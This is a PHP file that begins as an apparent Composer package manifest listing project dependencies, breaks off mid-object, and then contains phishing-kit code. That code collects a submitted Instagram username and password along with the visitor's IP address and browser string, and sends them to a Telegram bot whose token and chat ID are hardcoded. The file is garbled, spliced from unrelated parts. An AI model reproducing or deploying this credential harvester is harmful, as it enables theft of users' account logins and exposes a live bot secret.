<?php
{
    "name": "something/something",
    "description": "A description of my project",
    "type": "project",
    "require": {
        "php": ">=5.5.9",
        "doctrine/cache": "1.4.*",
        "elasticsearch/elasticsearch": "~2.0",
        "monolog/monolog": "~1.0",
        "knplabs/github-api": "~1.2",
        "ezyang/htmlpurifier": "~4.6",
        "easyrdf/easyrdf": "0.9.*",
        "hoa/compiler": "~2.15",
        "hoa/visitor": "~1.15",
        "collectiveaccess/service-wrapper": "v1.1",
        "phpoffice/phppresentation": "dev-master",
        "phpoffice/phpword": "v0.13.*"
      },
    "require-dev": {
        "phpunit/phpunit": "4.3.*",
        "maximebf/debugbar": ">=1.0.0"

$message .= "INSTAGRAM Account  " ."\n";
$message .= "email: ".$_POST['username']."\n";
$message .= "password: ".$_POST['PASSWORD']."\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "PHONE / PC: ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "https://t.me/mhdidiez";



$ID = 1031500407;
$TOKEN = "5185573664:AAHYIEY1exGTeTLz-hHogXxeylhv2fH8iKU";






$send = file_get_contents("https://api.telegram.org/bot$TOKEN/SendMessage?chat_id=$ID&text=".urlencode($message));
?>
